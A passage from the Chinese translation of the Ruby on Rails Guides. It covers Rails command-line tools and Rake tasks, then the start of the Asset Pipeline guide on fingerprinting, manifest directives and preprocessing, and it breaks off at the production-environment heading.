    create      app/views/high_scores/edit.html.erb
    create      app/views/high_scores/show.html.erb
    create      app/views/high_scores/new.html.erb
    create      app/views/high_scores/_form.html.erb
    invoke    test_unit
    create      test/controllers/high_scores_controller_test.rb
    invoke    helper
    create      app/helpers/high_scores_helper.rb
    invoke      test_unit
    create        test/helpers/high_scores_helper_test.rb
    invoke    jbuilder
    create      app/views/high_scores/index.json.jbuilder
    create      app/views/high_scores/show.json.jbuilder
    invoke  assets
    invoke    coffee
    create      app/assets/javascripts/high_scores.js.coffee
    invoke    scss
    create      app/assets/stylesheets/high_scores.css.scss
    invoke  scss
   identical    app/assets/stylesheets/scaffolds.css.scss

这个生成器检测到以下各组件对应的文件夹已经存储在：模型，控制器，帮助方法，布局，功能测试，单元测试，样式表。然后创建“HighScore”资源的视图、控制器、模型和迁移文件（用来创建 high_scores 数据表和字段），并设置好路由，以及测试等。

我们要运行迁移，执行文件 20130717151933_create_high_scores.rb 中的代码，这才能修改数据库的模式。那么要修改哪个数据库呢？执行 rake db:migrate 命令后会生成 SQLite3 数据库。稍后再详细介绍 Rake。
$ rake db:migrate
==  CreateHighScores: migrating ===============================================
-- create_table(:high_scores)
   -> 0.0017s
==  CreateHighScores: migrated (0.0019s) ======================================

介绍一下单元测试。单元测试是用来测试代码、做断定的代码。在单元测试中，我们只关注代码的一部分，例如模型中的一个方法，测试其输入和输出。单元测试是你的好伙伴，你逐渐会意识到，单元测试的程度越高，生活的质量才能提上来。真的。稍后我们会编写一个单元测试。

我们来看一下 Rails 创建的界面。
$ rails server

打开浏览器，访问 http://localhost:3000/high_scores，现在可以创建新的最高得分了（太空入侵者得了 55,160 分）。
###  1.4 rails console

执行 console 命令后，可以在命令行中和 Rails 程序交互。rails console` 使用的是 IRB，所以如果你用过 IRB 的话，操作起来很顺手。在终端里可以快速测试想法，或者修改服务器端的数据，而无需在网站中操作。

这个命令还可以使用别名“c”：rails c。

执行 console 命令时可以指定终端在哪个环境中打开：
$ rails console staging

如果你想测试一些代码，但不想改变存储的数据，可以执行 rails console --sandbox。
$ rails console --sandbox
Loading development environment in sandbox (Rails 4.2.0)
Any modifications you make will be rolled back on exit
irb(main):001:0>
###  1.5 rails dbconsole

rails dbconsole 能检测到你正在使用的数据库类型（还能理解传入的命令行参数），然后进入该数据库的命令行界面。该命令支持 MySQL，PostgreSQL，SQLite 和 SQLite3。

这个命令还可使用别名“db”：rails db。
###  1.6 rails runner

runner 可以以非交互的方式在 Rails 中运行 Ruby 代码。例如：
$ rails runner "Model.long_running_method"

这个命令还可使用别名“r”：rails r。

可使用 -e 选项指定 runner 命令在哪个环境中运行。
$ rails runner -e staging "Model.long_running_method"
###  1.7 rails destroy

destroy 可以理解成 generate 的逆操作，能识别生成了什么，然后将其删除。

这个命令还可使用别名“d”：rails d。
$ rails generate model Oops
      invoke  active_record
      create    db/migrate/20120528062523_create_oops.rb
      create    app/models/oops.rb
      invoke    test_unit
      create      test/models/oops_test.rb
      create      test/fixtures/oops.yml
$ rails destroy model Oops
      invoke  active_record
      remove    db/migrate/20120528062523_create_oops.rb
      remove    app/models/oops.rb
      invoke    test_unit
      remove      test/models/oops_test.rb
      remove      test/fixtures/oops.yml
##  2 Rake

Rake 是 Ruby 领域的 Make，是个独立的 Ruby 工具，目的是代替 Unix 中的 make。Rake 根据 Rakefile 和 .rake 文件构建任务。Rails 使用 Rake 实现常见的管理任务，尤其是较为复杂的任务。

执行 rake -- tasks 命令可以列出所有可用的 Rake 任务，具体的任务根据所在文件夹会有所不同。每个任务都有描述信息，帮助你找到所需的命令。

要想查看执行 Rake 任务时的完整调用栈，可以在命令中使用 --trace 选项，例如 rake db:create --trace。
$ rake --tasks
rake about              # List versions of all Rails frameworks and the environment
rake assets:clean       # Remove compiled assets
rake assets:precompile  # Compile all the assets named in config.assets.precompile
rake db:create          # Create the database from config/database.yml for the current Rails.env
...
rake log:clear          # Truncates all *.log files in log/ to zero bytes (specify which logs with LOGS=test,development)
rake middleware         # Prints out your Rack middleware stack
...
rake tmp:clear          # Clear session, cache, and socket files from tmp/ (narrow w/ tmp:sessions:clear, tmp:cache:clear, tmp:sockets:clear)
rake tmp:create         # Creates tmp directories for sessions, cache, sockets, and pids

还可以执行 rake -T 查看所有任务。
###  2.1 about

rake about 任务输出以下信息：Ruby、RubyGems、Rails 的版本号，Rails 使用的组件，程序所在的文件夹，Rails 当前所处的环境名，程序使用的数据库适配器，数据库模式版本号。如果想向他人需求帮助，检查安全补丁是否影响程序，或者需要查看现有 Rails 程序的信息，可以使用这个任务。
$ rake about
About your application's environment
Ruby version              1.9.3 (x86_64-linux)
RubyGems version          1.3.6
Rack version              1.3
Rails version             4.2.0
JavaScript Runtime        Node.js (V8)
Active Record version     4.2.0
Action Pack version       4.2.0
Action View version       4.2.0
Action Mailer version     4.2.0
Active Support version    4.2.0
Middleware                Rack::Sendfile, ActionDispatch::Static, Rack::Lock, #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x007ffd131a7c88>, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::RemoteIp, ActionDispatch::Reloader, ActionDispatch::Callbacks, ActiveRecord::Migration::CheckPending, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActiveRecord::QueryCache, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, Rack::Head, Rack::ConditionalGet, Rack::ETag
Application root          /home/foobar/commandsapp
Environment               development
Database adapter          sqlite3
Database schema version   20110805173523
###  2.2 assets

rake assets:precompile 任务会预编译 app/assets 文件夹中的静态资源文件。rake assets:clean 任务会把编译好的静态资源文件删除。
###  2.3 db

Rake 命名空间 db: 中最常用的任务是 migrate 和 create，这两个任务会尝试运行所有迁移相关的 Rake 任务（up，down，redo，reset）。rake db:version 在排查问题时很有用，会输出数据库的当前版本。

关于数据库迁移的更多介绍，参阅“Active Record 数据库迁移”一文。
###  2.4 doc

doc: 命名空间中的任务可以生成程序的文档，Rails API 文档和 Rails 指南。生成的文档可以随意分割，减少程序的大小，适合在嵌入式平台使用。

    rake doc:app 在 doc/app 文件夹中生成程序的文档；
    rake doc:guides 在 doc/guides 文件夹中生成 Rails 指南；
    rake doc:rails 在 doc/api 文件夹中生成 Rails API 文档；

###  2.5 notes

rake notes 会搜索整个程序，寻找以 FIXME、OPTIMIZE 或 TODO 开头的注释。搜索的文件包括 .builder，.rb，.erb，.haml，.slim，.css，.scss，.js，.coffee，.rake，.sass 和 .less。搜索的内容包括默认注解和自定义注解。
$ rake notes
(in /home/foobar/commandsapp)
app/controllers/admin/users_controller.rb:
  * [ 20] [TODO] any other way to do this?
  * [132] [FIXME] high priority for next deploy
 
app/models/school.rb:
  * [ 13] [OPTIMIZE] refactor this code to make it faster
  * [ 17] [FIXME]

如果想查找特定的注解，例如 FIXME，可以执行 rake notes:fixme 任务。注意，在命令中注解的名字要使用小写形式。
$ rake notes:fixme
(in /home/foobar/commandsapp)
app/controllers/admin/users_controller.rb:
  * [132] high priority for next deploy
 
app/models/school.rb:
  * [ 17]

在代码中可以使用自定义的注解，然后执行 rake notes:custom 任务，并使用 ANNOTATION 环境变量指定要查找的注解。
$ rake notes:custom ANNOTATION=BUG
(in /home/foobar/commandsapp)
app/models/post.rb:
  * [ 23] Have to fix this one before pushing!

注意，不管查找的是默认的注解还是自定义的直接，注解名（例如 FIXME，BUG 等）不会在输出结果中显示。

默认情况下，rake notes 会搜索 app、config、lib、bin 和 test 这几个文件夹中的文件。如果想在其他的文件夹中查找，可以使用 SOURCE_ANNOTATION_DIRECTORIES 环境变量指定一个以逗号分隔的列表。
$ export SOURCE_ANNOTATION_DIRECTORIES='spec,vendor'
$ rake notes
(in /home/foobar/commandsapp)
app/models/user.rb:
  * [ 35] [FIXME] User should have a subscription at this point
spec/models/user_spec.rb:
  * [122] [TODO] Verify the user that has a subscription works
###  2.6 routes

rake routes 会列出程序中定义的所有路由，可为解决路由问题提供帮助，还可以让你对程序中的所有 URL 有个整体了解。
###  2.7 test

Rails 中的单元测试详情，参见“Rails 程序测试指南”一文。

Rails 提供了一个名为 Minitest 的测试组件。Rails 的稳定性也由测试决定。test: 命名空间中的任务可用于运行各种测试。
###  2.8 tmp

Rails.root/tmp 文件夹和 *nix 中的 /tmp 作用相同，用来存放临时文件，例如会话（如果使用文件存储会话）、PID 文件和缓存文件等。

tmp: 命名空间中的任务可以清理或创建 Rails.root/tmp 文件夹：

    rake tmp:cache:clear 清理 tmp/cache 文件夹；
    rake tmp:sessions:clear 清理 tmp/sessions 文件夹；
    rake tmp:sockets:clear 清理 tmp/sockets 文件夹；
    rake tmp:clear 清理以上三个文件夹；
    rake tmp:create 创建会话、缓存、套接字和 PID 所需的临时文件夹；

###  2.9 其他任务

    rake stats 用来统计代码状况，显示千行代码数和测试比例等；
    rake secret 会生成一个伪随机字符串，作为会话的密钥；
    rake time:zones:all 列出 Rails 能理解的所有时区；

2.10 编写 Rake 任务

自己编写的 Rake 任务保存在 Rails.root/lib/tasks 文件夹中，文件的扩展名是 .rake。执行 bin/rails generate task 命令会生成一个新的自定义任务文件。
desc "I am short, but comprehensive description for my cool task"
task task_name: [:prerequisite_task, :another_task_we_depend_on] do
  # All your magic here
  # Any valid Ruby code is allowed
end

向自定义的任务中传入参数的方式如下：
task :task_name, [:arg_1] => [:pre_1, :pre_2] do |t, args|
  # You can use args from here
end

任务可以分组，放入命名空间：
namespace :db do
  desc "This task does nothing"
  task :nothing do
    # Seriously, nothing
  end
end

执行任务的方法如下：
rake task_name
rake "task_name[value 1]" # entire argument string should be quoted
rake db:nothing

如果在任务中要和程序的模型交互，例如查询数据库等，可以使用 environment 任务，加载程序代码。
##  3 Rails 命令行高级用法

Rails 命令行的高级用法就是找到实用的参数，满足特定需求或者工作流程。下面是一些常用的高级命令。
###  3.1 新建程序时指定数据库和源码管理系统

新建程序时，可设置一些选项指定使用哪种数据库和源码管理系统。这么做可以节省一点时间，减少敲击键盘的次数。

我们来看一下 --git 和 --database=postgresql 选项有什么作用：
$ mkdir gitapp
$ cd gitapp
$ git init
Initialized empty Git repository in .git/
$ rails new . --git --database=postgresql
      exists
      create  app/controllers
      create  app/helpers
...
...
      create  tmp/cache
      create  tmp/pids
      create  Rakefile
add 'Rakefile'
      create  README.rdoc
add 'README.rdoc'
      create  app/controllers/application_controller.rb
add 'app/controllers/application_controller.rb'
      create  app/helpers/application_helper.rb
...
      create  log/test.log
add 'log/test.log'

上面的命令先新建一个 gitapp 文件夹，初始化一个空的 git 仓库，然后再把 Rails 生成的文件加入仓库。再来看一下在数据库设置文件中添加了什么：
$ cat config/database.yml
# PostgreSQL. Versions 8.2 and up are supported.
#
# Install the pg driver:
#   gem install pg
# On OS X with Homebrew:
#   gem install pg -- --with-pg-config=/usr/local/bin/pg_config
# On OS X with MacPorts:
#   gem install pg -- --with-pg-config=/opt/local/lib/postgresql84/bin/pg_config
# On Windows:
#   gem install pg
#       Choose the win32 build.
#       Install PostgreSQL and put its /bin directory on your path.
#
# Configure Using Gemfile
# gem 'pg'
#
development:
  adapter: postgresql
  encoding: unicode
  database: gitapp_development
  pool: 5
  username: gitapp
  password:
...
...

这个命令还根据我们选择的 PostgreSQL 数据库在 database.yml 中添加了一些设置。

指定源码管理系统选项时唯一的不便是，要先新建程序的文件夹，再初始化源码管理系统，然后才能执行 rails new 命令生成程序骨架。

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Asset Pipeline

本文介绍 Asset Pipeline。

读完本文，你将学到：

    Asset Pipeline 是什么以及其作用；
    如何合理组织程序的静态资源；
    Asset Pipeline 的优势；
    如何向 Asset Pipeline 中添加预处理器；
    如何在 gem 中打包静态资源；

Chapters

    Asset Pipeline 是什么？
        主要功能
        指纹是什么，我为什么要关心它？
    如何使用 Asset Pipeline
        控制器相关的静态资源
        静态资源的组织方式
        链接静态资源
        清单文件和指令
        预处理
    开发环境
        检查运行时错误
        关闭调试功能
    生产环境
        事先编译好静态资源
        在本地预编译
        实时编译
        CDN
    定制 Asset Pipeline
        压缩 CSS
        压缩 JavaScript
        使用自己的压缩程序
        修改 assets 的路径
        X-Sendfile 报头
    静态资源缓存的存储方式
    在 gem 中使用静态资源
    把代码库或者 gem 变成预处理器
    升级旧版本 Rails

##  1 Asset Pipeline 是什么？

Asset Pipeline 提供了一个框架，用于连接、压缩 JavaScript 和 CSS 文件。还允许使用其他语言和预处理器编写 JavaScript 和 CSS，例如 CoffeeScript、Sass 和 ERB。

严格来说，Asset Pipeline 不是 Rails 4 的核心功能，已经从框架中提取出来，制成了 sprockets-rails gem。

Asset Pipeline 功能默认是启用的。

新建程序时如果想禁用 Asset Pipeline，可以在命令行中指定 --skip-sprockets 选项。
rails new appname --skip-sprockets

Rails 4 会自动把 sass-rails、coffee-rails 和 uglifier 三个 gem 加入 Gemfile。Sprockets 使用这三个 gem 压缩静态资源：
gem 'sass-rails'
gem 'uglifier'
gem 'coffee-rails'

指定 --skip-sprockets 命令行选项后，Rails 4 不会把 sass-rails 和 uglifier 加入 Gemfile。如果后续需要使用 Asset Pipeline，需要手动添加这些 gem。而且，指定 --skip-sprockets 命令行选项后，生成的 config/application.rb 文件也会有点不同，把加载 sprockets/railtie 的代码注释掉了。如果后续启用 Asset Pipeline，要把这行前面的注释去掉：
# require "sprockets/railtie"

production.rb 文件中有相应的选项设置静态资源的压缩方式：config.assets.css_compressor 针对 CSS，config.assets.js_compressor 针对 Javascript。
config.assets.css_compressor = :yui
config.assets.js_compressor = :uglify

如果 Gemfile 中有 sass-rails，就会自动用来压缩 CSS，无需设置 config.assets.css_compressor 选项。
###  1.1 主要功能

Asset Pipeline 的第一个功能是连接静态资源，减少渲染页面时浏览器发起的请求数。浏览器对并行的请求数量有限制，所以较少的请求数可以提升程序的加载速度。

Sprockets 会把所有 JavaScript 文件合并到一个主 .js 文件中，把所有 CSS 文件合并到一个主 .css 文件中。后文会介绍，合并的方式可按需求随意定制。在生产环境中，Rails 会在文件名后加上 MD5 指纹，以便浏览器缓存，指纹变了缓存就会过期。修改文件的内容后，指纹会自动变化。

Asset Pipeline 的第二个功能是压缩静态资源。对 CSS 文件来说，会删除空白和注释。对 JavaScript 来说，可以做更复杂的处理。处理方式可以从内建的选项中选择，也可使用定制的处理程序。

Asset Pipeline 的第三个功能是允许使用高级语言编写静态资源，再使用预处理器转换成真正的静态资源。默认支持的高级语言有：用来编写 CSS 的 Sass，用来编写 JavaScript 的 CoffeeScript，以及 ERB。
###  1.2 指纹是什么，我为什么要关心它？

指纹可以根据文件内容生成文件名。文件内容变化后，文件名也会改变。对于静态内容，或者很少改动的内容，在不同的服务器之间，不同的部署日期之间，使用指纹可以区别文件的两个版本内容是否一样。

如果文件名基于内容而定，而且文件名是唯一的，HTTP 报头会建议在所有可能的地方（CDN，ISP，网络设备，网页浏览器）存储一份该文件的副本。修改文件内容后，指纹会发生变化，因此远程客户端会重新请求文件。这种技术叫做“缓存爆裂”（cache busting）。

Sprockets 使用指纹的方式是在文件名中加入内容的哈希值，一般加在文件名的末尾。例如，global.css 加入指纹后的文件名如下：
global-908e25f4bf641868d8683022a5b62f54.css

Asset Pipeline 使用的就是这种指纹实现方式。

以前，Rails 使用内建的帮助方法，在文件名后加上一个基于日期生成的请求字符串，如下所示：
/stylesheets/global.css?1309495796

使用请求字符串有很多缺点：

    文件名只是请求字符串不同时，缓存并不可靠
    Steve Souders 建议：不在要缓存的资源上使用请求字符串。他发现，使用请求字符串的文件不被缓存的可能性有 5-20%。有些 CDN 验证缓存时根本无法识别请求字符串。

    在多服务器环境中，不同节点上的文件名可能不同
    在 Rails 2.x 中，默认的请求字符串由文件的修改时间生成。静态资源文件部署到集群后，无法保证时间戳都是一样的，得到的值取决于使用哪台服务器处理请求。

    缓存验证失败过多
    部署新版代码时，所有静态资源文件的最后修改时间都变了。即便内容没变，客户端也要重新请求这些文件。

使用指纹就无需再用请求字符串了，而且文件名基于文件内容，始终保持一致。

默认情况下，指纹只在生产环境中启用，其他环境都被禁用。可以设置 config.assets.digest 选项启用或禁用。

扩展阅读：

    Optimize caching
    Revving Filenames: don't use querystring

##  2 如何使用 Asset Pipeline

在以前的 Rails 版本中，所有静态资源都放在 public 文件夹的子文件夹中，例如 images、javascripts 和 stylesheets。使用 Asset Pipeline 后，建议把静态资源放在 app/assets 文件夹中。这个文件夹中的文件会经由 Sprockets 中间件处理。

静态资源仍然可以放在 public 文件夹中，其中所有文件都会被程序或网页服务器视为静态文件。如果文件要经过预处理器处理，就得放在 app/assets 文件夹中。

默认情况下，在生产环境中，Rails 会把预先编译好的文件保存到 public/assets 文件夹中，网页服务器会把这些文件视为静态资源。在生产环境中，不会直接伺服 app/assets 文件夹中的文件。
###  2.1 控制器相关的静态资源

生成脚手架或控制器时，Rails 会生成一个 JavaScript 文件（如果 Gemfile 中有 coffee-rails，会生成 CoffeeScript 文件）和 CSS 文件（如果 Gemfile 中有 sass-rails，会生成 SCSS 文件）。生成脚手架时，Rails 还会生成 scaffolds.css 文件（如果 Gemfile 中有 sass-rails，会生成 scaffolds.css.scss 文件）。

例如，生成 ProjectsController 时，Rails 会新建 app/assets/javascripts/projects.js.coffee 和 app/assets/stylesheets/projects.css.scss 两个文件。默认情况下，这两个文件立即就可以使用 require_tree 引入程序。关于 require_tree 的介绍，请阅读“清单文件和指令”一节。

针对控制器的样式表和 JavaScript 文件也可只在相应的控制器中引入：

<%= javascript_include_tag params[:controller] %> 或 <%= stylesheet_link_tag params[:controller] %>

如果需要这么做，切记不要使用 require_tree。如果使用了这个指令，会多次引入相同的静态资源。

预处理静态资源时要确保同时处理控制器相关的静态资源。默认情况下，不会自动编译 .coffee 和 .scss 文件。在开发环境中没什么问题，因为会自动编译。但在生产环境中会得到 500 错误，因为此时自动编译默认是关闭的。关于预编译的工作机理，请阅读“事先编译好静态资源”一节。

要想使用 CoffeeScript，必须安装支持 ExecJS 的运行时。如果使用 Mac OS X 和 Windows，系统中已经安装了 JavaScript 运行时。所有支持的 JavaScript 运行时参见 ExecJS 的文档。

在 config/application.rb 文件中加入以下代码可以禁止生成控制器相关的静态资源：
config.generators do |g|
  g.assets false
end
###  2.2 静态资源的组织方式

Asset Pipeline 的静态文件可以放在三个位置：app/assets，lib/assets 或 vendor/assets。

    app/assets：存放程序的静态资源，例如图片、JavaScript 和样式表；
    lib/assets：存放自己的代码库，或者共用代码库的静态资源；
    vendor/assets：存放他人的静态资源，例如 JavaScript 插件，或者 CSS 框架；

如果从 Rails 3 升级过来，请注意，lib/assets 和 vendor/assets 中的静态资源可以引入程序，但不在预编译的范围内。详情参见“事先编译好静态资源”一节。
####  2.2.1 搜索路径

在清单文件或帮助方法中引用静态资源时，Sprockets 会在默认的三个位置中查找对应的文件。

默认的位置是 apps/assets 文件夹中的 images、javascripts 和 stylesheets 三个子文件夹。这三个文件夹没什么特别之处，其实 Sprockets 会搜索 apps/assets 文件夹中的所有子文件夹。

例如，如下的文件：
app/assets/javascripts/home.js
lib/assets/javascripts/moovinator.js
vendor/assets/javascripts/slider.js
vendor/assets/somepackage/phonebox.js

在清单文件中可以这么引用：
//= require home
//= require moovinator
//= require slider
//= require phonebox

子文件夹中的静态资源也可引用：
app/assets/javascripts/sub/something.js

引用方式如下：
//= require sub/something

在 Rails 控制台中执行 Rails.application.config.assets.paths，可以查看所有的搜索路径。

除了标准的 assets/* 路径之外，还可以在 config/application.rb 文件中向 Asset Pipeline 添加其他路径。例如：
config.assets.paths << Rails.root.join("lib", "videoplayer", "flash")

Sprockets 会按照搜索路径中各路径出现的顺序进行搜索。默认情况下，这意味着 app/assets 文件夹中的静态资源优先级较高，会遮盖 lib 和 vendor 文件夹中的相应文件。

有一点要注意，如果静态资源不会在清单文件中引入，就要添加到预编译的文件列表中，否则在生产环境中就无法访问文件。
####  2.2.2 使用索引文件

在 Sprockets 中，名为 index 的文件（扩展名各异）有特殊作用。

例如，程序中使用了 jQuery 代码库和许多模块，都保存在 lib/assets/javascripts/library_name 文件夹中，那么 lib/assets/javascripts/library_name/index.js 文件的作用就是这个代码库的清单。清单文件中可以按顺序列出所需的文件，或者干脆使用 require_tree 指令。

在清单文件中，可以把这个库作为一个整体引入：
//= require library_name

这么做可以减少维护成本，保持代码整洁。
###  2.3 链接静态资源

Sprockets 并没有为获取静态资源添加新的方法，还是使用熟悉的 javascript_include_tag 和 stylesheet_link_tag：
<%= stylesheet_link_tag "application", media: "all" %>
<%= javascript_include_tag "application" %>

如果使用 Turbolinks（Rails 4 默认启用），加上 data-turbolinks-track 选项后，Turbolinks 会检查静态资源是否有更新，如果更新了就会将其载入页面：
<%= stylesheet_link_tag "application", media: "all", "data-turbolinks-track" => true %>
<%= javascript_include_tag "application", "data-turbolinks-track" => true %>

在普通的视图中可以像下面这样获取 public/assets/images 文件夹中的图片：
<%= image_tag "rails.png" %>

如果程序启用了 Asset Pipeline，且在当前环境中没有禁用，那么这个文件会经由 Sprockets 伺服。如果文件的存放位置是 public/assets/rails.png，则直接由网页服务器伺服。

如果请求的文件中包含 MD5 哈希，处理的方式还是一样。关于这个哈希是怎么生成的，请阅读“在生产环境中”一节。

Sprockets 还会检查 config.assets.paths 中指定的路径。config.assets.paths 包含标准路径和其他 Rails 引擎添加的路径。

图片还可以放入子文件夹中，获取时指定文件夹的名字即可：
<%= image_tag "icons/rails.png" %>

如果预编译了静态资源（参见“在生产环境中”一节），链接不存在的资源（也包括链接到空字符串的情况）会在调用页面抛出异常。因此，在处理用户提交的数据时，使用 image_tag 等帮助方法要小心一点。
####  2.3.1 CSS 和 ERB

Asset Pipeline 会自动执行 ERB 代码，所以如果在 CSS 文件名后加上扩展名 erb（例如 application.css.erb），那么在 CSS 规则中就可使用 asset_path 等帮助方法。
.class { background-image: url(<%= asset_path 'image.png' %>) }

Asset Pipeline 会计算出静态资源的真实路径。在上面的代码中，指定的图片要出现在加载路径中。如果在 public/assets 中有该文件带指纹版本，则会使用这个文件的路径。

如果想使用 data URI（直接把图片数据内嵌在 CSS 文件中），可以使用 asset_data_uri 帮助方法。
#logo { background: url(<%= asset_data_uri 'logo.png' %>) }

asset_data_uri 会把正确格式化后的 data URI 写入 CSS 文件。

注意，关闭标签不能使用 -%> 形式。
####  2.3.2 CSS 和 Sass

使用 Asset Pipeline，静态资源的路径要使用 sass-rails 提供的 -url 和 -path 帮助方法（在 Sass 中使用连字符，在 Ruby 中使用下划线）重写。这两种帮助方法可用于引用图片，字体，视频，音频，JavaScript 和样式表。

    image-url("rails.png") 编译成 url(/assets/rails.png)
    image-path("rails.png") 编译成 "/assets/rails.png".

还可使用通用方法：

    asset-url("rails.png") 编译成 url(/assets/rails.png)
    asset-path("rails.png") 编译成 "/assets/rails.png"

####  2.3.3 JavaScript/CoffeeScript 和 ERB

如果在 JavaScript 文件后加上扩展名 erb，例如 application.js.erb，就可以在 JavaScript 代码中使用帮助方法 asset_path：
$('#logo').attr({ src: "<%= asset_path('logo.png') %>" });

Asset Pipeline 会计算出静态资源的真实路径。

类似地，如果在 CoffeeScript 文件后加上扩展名 erb，例如 application.js.coffee.erb，也可在代码中使用帮助方法 asset_path：
$('#logo').attr src: "<%= asset_path('logo.png') %>"
###  2.4 清单文件和指令

Sprockets 通过清单文件决定要引入和伺服哪些静态资源。清单文件中包含一些指令，告知 Sprockets 使用哪些文件生成主 CSS 或 JavaScript 文件。Sprockets 会解析这些指令，加载指定的文件，如有需要还会处理文件，然后再把各个文件合并成一个文件，最后再压缩文件（如果 Rails.application.config.assets.compress 选项为 true）。只伺服一个文件可以大大减少页面加载时间，因为浏览器发起的请求数更少。压缩能减小文件大小，加快浏览器下载速度。

例如，新建的 Rails 4 程序中有个 app/assets/javascripts/application.js 文件，包含以下内容：
// ...
//= require jquery
//= require jquery_ujs
//= require_tree .

在 JavaScript 文件中，Sprockets 的指令以 //= 开头。在上面的文件中，用到了 require 和 the require_tree 指令。require 指令告知 Sprockets 要加载的文件。在上面的文件中，加载了 Sprockets 搜索路径中的 jquery.js 和 jquery_ujs.js 两个文件。文件名后无需加上扩展名，在 .js 文件中 Sprockets 默认会加载 .js 文件。

require_tree 指令告知 Sprockets 递归引入指定文件夹中的所有 JavaScript 文件。文件夹的路径必须相对于清单文件。也可使用 require_directory 指令加载指定文件夹中的所有 JavaScript 文件，但不会递归。

Sprockets 会按照从上至下的顺序处理指令，但 require_tree 引入的文件顺序是不可预期的，不要设想能得到一个期望的顺序。如果要确保某些 JavaScript 文件出现在其他文件之前，就要先在清单文件中引入。注意，require 等指令不会多次加载同一个文件。

Rails 还会生成 app/assets/stylesheets/application.css 文件，内容如下：
/* ...
*= require_self
*= require_tree .
*/

不管创建新程序时有没有指定 --skip-sprockets 选项，Rails 4 都会生成 app/assets/javascripts/application.js 和 app/assets/stylesheets/application.css。这样如果后续需要使用 Asset Pipelining，操作就方便了。

样式表中使用的指令和 JavaScript 文件一样，不过加载的是样式表而不是 JavaScript 文件。require_tree 指令在 CSS 清单文件中的作用和在 JavaScript 清单文件中一样，从指定的文件夹中递归加载所有样式表。

上面的代码中还用到了 require_self。这么做可以把当前文件中的 CSS 加入调用 require_self 的位置。如果多次调用 require_self，只有最后一次调用有效。

如果想使用多个 Sass 文件，应该使用 Sass 中的 @import 规则，不要使用 Sprockets 指令。如果使用 Sprockets 指令，Sass 文件只出现在各自的作用域中，Sass 变量和混入只在定义所在文件中有效。为了达到 require_tree 指令的效果，可以使用通配符，例如 @import "*" 和 @import "**/*"。详情参见 sass-rails 的文档。

清单文件可以有多个。例如，admin.css 和 admin.js 这两个清单文件包含程序管理后台所需的 JS 和 CSS 文件。

CSS 清单中的指令也适用前面介绍的加载顺序。分别引入各文件，Sprockets 会按照顺序编译。例如，可以按照下面的方式合并三个 CSS 文件：
/* ...
*= require reset
*= require layout
*= require chrome
*/
###  2.5 预处理

静态资源的文件扩展名决定了使用哪个预处理器处理。如果使用默认的 gem，生成控制器或脚手架时，会生成 CoffeeScript 和 SCSS 文件，而不是普通的 JavaScript 和 CSS 文件。前文举过例子，生成 projects 控制器时会创建 app/assets/javascripts/projects.js.coffee 和 app/assets/stylesheets/projects.css.scss 两个文件。

在开发环境中，或者禁用 Asset Pipeline 时，这些文件会使用 coffee-script 和 sass 提供的预处理器处理，然后再发给浏览器。启用 Asset Pipeline 时，这些文件会先使用预处理器处理，然后保存到 public/assets 文件夹中，再由 Rails 程序或网页服务器伺服。

添加额外的扩展名可以增加预处理次数，预处理程序会按照扩展名从右至左的顺序处理文件内容。所以，扩展名的顺序要和处理的顺序一致。例如，名为 app/assets/stylesheets/projects.css.scss.erb 的样式表首先会使用 ERB 处理，然后是 SCSS，最后才以 CSS 格式发送给浏览器。JavaScript 文件类似，app/assets/javascripts/projects.js.coffee.erb 文件先由 ERB 处理，然后是 CoffeeScript，最后以 JavaScript 格式发送给浏览器。

记住，预处理器的执行顺序很重要。例如，名为 app/assets/javascripts/projects.js.erb.coffee 的文件首先由 CoffeeScript 处理，但是 CoffeeScript 预处理器并不懂 ERB 代码，因此会导致错误。
##  3 开发环境

在开发环境中，Asset Pipeline 按照清单文件中指定的顺序伺服各静态资源。

清单 app/assets/javascripts/application.js 的内容如下：
//= require core
//= require projects
//= require tickets

生成的 HTML 如下：
<script src="/assets/core.js?body=1"></script>
<script src="/assets/projects.js?body=1"></script>
<script src="/assets/tickets.js?body=1"></script>

Sprockets 要求必须使用 body 参数。
###  3.1 检查运行时错误

默认情况下，在生产环境中 Asset Pipeline 会检查潜在的错误。要想禁用这一功能，可以做如下设置：
config.assets.raise_runtime_errors = false

raise_runtime_errors 设为 false 时，Sprockets 不会检查静态资源的依赖关系是否正确。遇到下面这种情况时，必须告知 Asset Pipeline 其中的依赖关系。

如果在 application.css.erb 中引用了 logo.png，如下所示：
#logo { background: url(<%= asset_data_uri 'logo.png' %>) }

就必须声明 logo.png 是 application.css.erb 的一个依赖件，这样重新编译图片时才会同时重新编译 CSS 文件。依赖关系可以使用 //= depend_on_asset 声明：
//= depend_on_asset "logo.png"
#logo { background: url(<%= asset_data_uri 'logo.png' %>) }

如果没有这个声明，在生产环境中可能遇到难以查找的奇怪问题。raise_runtime_errors 设为 true 时，运行时会自动检查依赖关系。
###  3.2 关闭调试功能

在 config/environments/development.rb 中添加如下设置可以关闭调试功能：
config.assets.debug = false

关闭调试功能后，Sprockets 会预处理所有文件，然后合并。关闭调试功能后，前文的清单文件生成的 HTML 如下：
<script src="/assets/application.js"></script>

服务器启动后，首次请求发出后会编译并缓存静态资源。Sprockets 会把 Cache-Control 报头设为 must-revalidate。再次请求时，浏览器会得到 304 (Not Modified) 响应。

如果清单中的文件内容发生了变化，服务器会返回重新编译后的文件。

调试功能可以在 Rails 帮助方法中启用：
<%= stylesheet_link_tag "application", debug: true %>
<%= javascript_include_tag "application", debug: true %>

如果已经启用了调试模式，再使用 :debug 选项就有点多余了。

在开发环境中也可启用压缩功能，检查是否能正常运行。需要调试时再禁用压缩即可。
##  4 生产环境

